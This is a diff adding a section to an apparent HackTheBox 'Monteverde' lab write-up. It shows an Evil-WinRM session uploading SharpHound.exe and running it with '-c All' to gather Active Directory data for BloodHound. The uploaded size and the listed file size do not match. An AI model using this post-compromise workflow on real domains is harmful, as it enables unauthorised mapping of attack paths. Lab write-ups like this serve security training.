@@ -240,3 +240,27 @@ This user has access over WINRM
 
 This user has no extra access on SMB
 
+# Bloodhound 
+
+```python
+*Evil-WinRM* PS C:\Users\mhope\Documents> upload SharpHound.exe
+                                        
+Info: Uploading /home/kali/htb/Monteverde/SharpHound.exe to C:\Users\mhope\Documents\SharpHound.exe
+                                        
+Data: 1802240 bytes of 1802240 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\mhope\Documents> dir
+
+
+    Directory: C:\Users\mhope\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/18/2026  11:22 AM        1351680 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\mhope\Documents> .\SharpHound.exe -c All
+```
+Ill upload sharphound and grab the bloodhound data
